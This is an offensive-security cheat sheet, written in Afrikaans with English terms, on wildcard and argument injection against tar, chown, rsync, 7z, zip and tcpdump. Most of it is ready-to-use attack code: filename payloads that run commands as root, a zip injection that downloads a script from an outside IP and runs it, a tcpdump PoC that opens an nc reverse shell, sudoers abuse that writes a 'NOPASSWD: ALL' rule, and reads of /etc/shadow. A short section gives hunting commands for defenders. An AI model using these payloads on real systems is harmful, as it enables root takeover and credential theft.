# Wildcard Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (ook bekend as *glob*) **argument injection** vind plaas wanneer ’n bevoorregte script ’n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … uitvoer met ’n wildcard wat nie tussen aanhalingstekens is nie, soos `*`.
> Omdat die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan ’n aanvaller wat lêers in die werkgids kan skep, lêername saamstel wat met `-` begin sodat dit as **options in plaas van data** geïnterpreteer word, en sodoende arbitrêre flags of selfs commands insmokkel.
> Hierdie bladsy versamel die nuttigste primitives, onlangse navorsing en moderne detections vir 2023-2025.

## chown / chmod

Jy kan die **eienaar/groep of die permission bits van ’n arbitrêre lêer kopieer** deur die `--reference` flag te misbruik:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Wanneer root later iets soos die volgende uitvoer:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` word geïnjecteer, wat veroorsaak dat *alle* ooreenstemmende lêers die eienaarskap/toestemmings van `/root/secret``file` oorneem.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Sien ook die klassieke DefenseCode-artikel vir besonderhede.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Voer arbitrêre opdragte uit deur die **checkpoint**-funksie te misbruik:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Sodra root byvoorbeeld `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.

### bsdtar / macOS 14+

Die verstek-`tar` op onlangse macOS (gebaseer op `libarchive`) implementeer nie *`--checkpoint`* nie, maar jy kan steeds code-execution bewerkstellig met die **--use-compress-program**-flag, wat jou toelaat om ’n eksterne compressor te spesifiseer.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Wanneer ’n bevoorregte skrip `tar -cf backup.tar *` uitvoer, sal `/bin/sh` begin word.

---

## rsync

`rsync` laat jou toe om die remote shell of selfs die remote binary te override via command-line flags wat met `-e` of `--rsync-path` begin:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
As root die directory later met `rsync -az * backup:/srv/` archiveer, laat die injected flag jou shell aan die remote kant spawn.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selfs wanneer die privileged script die wildcard *defensief* met `--` prefix (om option parsing te stop), ondersteun die 7-Zip format **file list files** deur die filename met `@` te prefix. Deur dit met ’n symlink te kombineer, kan jy *arbitrary lêers exfiltrate*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
As root iets soos die volgende uitvoer:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal ophou, **terwyl dit die inhoud na stderr druk**.

Dit oorleef `-- *`, omdat die 7-Zip CLI eksplisiet beide gewone lêername en `@listfiles` as positional inputs aanvaar, dus word 'n letterlike lêernaam soos `@root.txt` steeds spesiaal hanteer.

---

## zip

Twee baie praktiese primitives bestaan wanneer 'n toepassing user-controlled filenames aan `zip` deurgee (hetsy via 'n wildcard of deur name te enumerating sonder `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` aktiveer “test archive” en `-TT <cmd>` vervang die tester met 'n arbitrary program (long form: `--unzip-command <cmd>`). As jy filenames kan inject wat met `-` begin, split die flags oor afsonderlike filenames sodat short-options parsing werk:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notas
- Moenie ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos aangedui.
- As slashes deur die app van lêername verwyder word, haal dit vanaf ’n kaal host/IP (standaardpad `/index.html`) en stoor dit plaaslik met `-O`, en voer dit dan uit.
- Jy kan parsing met `-sc` (toon verwerkte argv) of `-h2` (meer hulp) ontfout om te verstaan hoe jou tokens verwerk word.

Voorbeeld (plaaslike gedrag op zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Indien die weblaag `zip` se stdout/stderr eggo (algemeen met naïewe wrappers), sal geïnjekteerde flags soos `--help` of foute van verkeerde opsies in die HTTP-response verskyn, wat command-line injection bevestig en help met die verfyning van payloads.

---

## Addisionele binaries wat kwesbaar is vir wildcard injection (2023-2025-kortlys)

Die volgende commands is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd as ’n *lêernaam* binne ’n skryfbare gids geskep wat later met ’n wildcard verwerk sal word:

| Binary | Flag om te misbruik | Effek |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrêre `@file` | Lees lêerinhoud |
| `flock` | `-c <cmd>` | Voer command uit |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git oor SSH |
| `scp`   | `-S <cmd>` | Begin ’n arbitrêre program in plaas van ssh |

Hierdie primitives is minder algemeen as die *tar/rsync/zip*-klassiekers, maar dit is die moeite werd om daarvoor te kyk tydens hunting.

---

## Hunting na kwesbare wrappers en jobs

Onlangse gevallestudies het getoon dat wildcard/argv injection nie meer net ’n **cron + tar**-probleem is nie.<sup>[[5]](#references)</sup> Dieselfde bug-klas verskyn steeds in:

- webfeatures wat "alles as zip/tar aflaai" uit aanvaller-beheerde upload-gidse
- vendor/appliance debug shells wat ’n **tcpdump**-wrapper met aanvaller-beheerde lêernaam/filter-velde blootstel
- backup- of rotation-jobs wat `tar`, `rsync`, `7z`, `zip`, `chown` of `chmod` op skryfbare gidse uitvoer

Nuttige triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Vinnige heuristieke:

- `-- *` is 'n goeie oplossing vir baie GNU tools, maar **nie** vir `7z`/`7za` nie, omdat `@listfiles` afsonderlik geparse word.
- Vir `zip`, soek wrappers wat user-controlled filenames direk opnoem; short-option splitting (`-T` + `-TT <cmd>`) werk steeds selfs sonder 'n shell glob.
- Vir `tcpdump`, let veral op wrappers waarmee jy **output file names**, **rotation settings** of **capture-file replay**-argumente kan beheer.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wanneer 'n restricted shell of vendor wrapper 'n `tcpdump` command line saamstel deur user-controlled fields (bv. 'n "file name"-parameter) aanmekaar te voeg sonder streng quoting/validasie, kan jy ekstra `tcpdump`-flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files) en `-z <cmd>` (post-rotate command) lewer arbitrary command execution as the user running tcpdump (dikwels root op appliances).<sup>[[1]](#references)[[4]](#references)</sup>

Voorwaardes:

- Jy kan die `argv` wat aan `tcpdump` deurgegee word, beïnvloed (bv. via 'n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Die wrapper saniteer nie spasies of tokens wat met `-` begin in die file name-veld nie.

Klassieke PoC (voer 'n reverse shell script vanaf 'n writable path uit):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Besonderhede:

- `-G 1 -W 1` dwing ’n onmiddellike rotate af ná die eerste matching packet.
- `-z <cmd>` voer die post-rotate command een keer per rotation uit. Baie builds voer `<cmd> <savefile>` uit. Indien `<cmd>` ’n script/interpreter is, maak seker dat die argument handling by jou payload pas.

Variante sonder verwyderbare media:

- Indien jy enige ander primitive het om files te skryf (byvoorbeeld ’n aparte command wrapper wat output redirection toelaat), plaas jou script in ’n bekende path en trigger `-z /bin/sh /path/script.sh` of `-z /path/script.sh`, afhangend van platform semantics.
- Sommige vendor wrappers rotate na attacker-controllable locations. Indien jy die rotated path kan beïnvloed (symlink/directory traversal), kan jy `-z` stuur om content uit te voer wat jy volledig beheer sonder eksterne media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Baie algemene sudoers anti-pattern:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Kwessies
- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w`-argument. `tcpdump` aanvaar veelvuldige `-w`-opsies; die laaste een geld.
- Die reël beperk nie ander opsies nie, dus word `-Z`, `-r`, `-V`, ens. toegelaat.

Primitiewe
- Oorskryf die bestemmingspad met ’n tweede `-w` (slegs die eerste een voldoen aan sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal binne die eerste `-w` om uit die beperkte boomstruktuur te ontsnap:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Dwing uitvoereienaarskap af met `-Z root` (skep root-owned files enige plek):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Skryf van arbitrêre inhoud deur ’n crafted PCAP via `-r` te replay (bv. om ’n sudoers-reël te drop):

<details>
<summary>Skep ’n PCAP wat die presiese ASCII payload bevat en skryf dit as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrêre lêerlees/geheime leak met `-V <file>` (interpreteer ’n lys van savefiles). Foutdiagnostiek eggo dikwels reëls, wat inhoud lek:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Verwysings

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
